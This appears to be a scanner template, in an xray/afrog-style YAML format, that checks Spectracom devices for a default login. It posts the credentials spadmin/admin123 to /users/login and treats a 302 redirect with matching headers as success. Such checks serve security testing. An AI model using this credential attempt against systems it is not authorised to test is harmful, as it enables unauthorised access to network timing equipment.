expression: r0()
id: spectracom-default-password
info:
  author: madrobot
  description: fofa "Spectracom"
  name: Spectracom Default Login
  severity: high
  verified: false
rules:
  r0:
    expression: response.status == 302 && response.raw_header.bcontains(b'spectracom')
      && response.raw_header.bcontains(b'deleted')
    request:
      body: data%5Bbutton%5D=submit&data%5BUser%5D%5Busername%5D=spadmin&data%5BUser%5D%5Bpassword%5D=admin123
      method: POST
      path: /users/login
